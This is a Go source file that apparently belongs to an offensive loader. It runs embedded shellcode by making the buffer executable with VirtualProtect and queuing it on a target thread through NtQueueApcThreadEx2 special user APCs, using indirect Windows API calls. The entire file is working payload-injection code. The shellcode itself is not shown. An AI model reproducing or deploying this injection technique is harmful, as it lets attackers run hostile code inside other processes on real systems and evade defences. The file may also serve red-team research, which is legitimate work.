package sh

import (
	"fmt"
	"unsafe"
	api "github.com/carved4/go-wincall"
)

// QUEUE_USER_APC_FLAGS constants
const (
	QUEUE_USER_APC_FLAGS_NONE          = 0x00000000
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC = 0x00000001
)

func Execute(threadHandle uintptr) error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	// Make shellcode executable
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                    // lpAddress
		uintptr(len(shellcode)),        // dwSize
		0x40,                           // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	// Queue APC to target thread using NtQueueApcThreadEx2
	success, err = api.Call("ntdll.dll", "NtQueueApcThreadEx2",
		threadHandle,                           // ThreadHandle
		uintptr(0),                            // ReserveHandle (optional)
		uintptr(QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC), // ApcFlags
		shellcodePtr,                          // ApcRoutine (our shellcode)
		uintptr(0),                            // ApcArgument1 (optional)
		uintptr(0),                            // ApcArgument2 (optional)
		uintptr(0),                            // ApcArgument3 (optional)
	)
	if err != nil || success != 0 { // NTSTATUS 0 = SUCCESS
		return fmt.Errorf("NtQueueApcThreadEx2 failed: %v (status: 0x%x)", err, success)
	}
	
	return nil
}

// ExecuteWithReserve executes shellcode via APC with a reserve handle
func ExecuteWithReserve(threadHandle, reserveHandle uintptr) error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	// Make shellcode executable
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                    // lpAddress
		uintptr(len(shellcode)),        // dwSize
		0x40,                           // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	// Queue APC with reserve handle
	success, err = api.Call("ntdll.dll", "NtQueueApcThreadEx2",
		threadHandle,                           // ThreadHandle
		reserveHandle,                         // ReserveHandle
		uintptr(QUEUE_USER_APC_FLAGS_NONE),   // ApcFlags
		shellcodePtr,                          // ApcRoutine (our shellcode)
		uintptr(0),                            // ApcArgument1 (optional)
		uintptr(0),                            // ApcArgument2 (optional)
		uintptr(0),                            // ApcArgument3 (optional)
	)
	if err != nil || success != 0 { // NTSTATUS 0 = SUCCESS
		return fmt.Errorf("NtQueueApcThreadEx2 failed: %v (status: 0x%x)", err, success)
	}
	
	return nil
}

